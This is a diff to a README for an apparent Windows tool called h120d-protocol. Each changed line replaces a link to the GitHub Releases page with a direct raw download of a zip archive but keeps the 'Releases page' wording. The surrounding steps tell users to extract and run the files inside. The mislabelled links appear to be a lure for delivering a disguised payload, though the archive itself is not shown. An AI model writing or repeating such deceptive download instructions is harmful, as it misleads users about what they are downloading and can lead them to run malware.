@@ -1,16 +1,16 @@
 # 🛰️ h120d-protocol - Control the H120D with clear steps
 
-[![Download](https://img.shields.io/badge/Download-Releases-6C7BD9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eeeg2610/h120d-protocol/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-6C7BD9?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/eeeg2610/h120d-protocol/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip)
 
 Use the latest release file for Windows. If the release includes a `.zip` file, download it first, then extract it before you run the app or scripts inside.
 
 ## 🪟 Get started on Windows
 
-1. Open the [Releases page](https://github.com/eeeg2610/h120d-protocol/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip).
 2. Find the latest release near the top.
 3. Download the Windows file or the release archive.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -152,7 +152,7 @@ If the tool needs extra files, keep all release files in the same folder.
 
 ## 📎 Download again if needed
 
-If you need the latest files, go to the [GitHub Releases page](https://github.com/eeeg2610/h120d-protocol/releases) and download the newest release package for Windows.
+If you need the latest files, go to the [GitHub Releases page](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip) and download the newest release package for Windows.
 
 ## 🔧 Repo topics
 
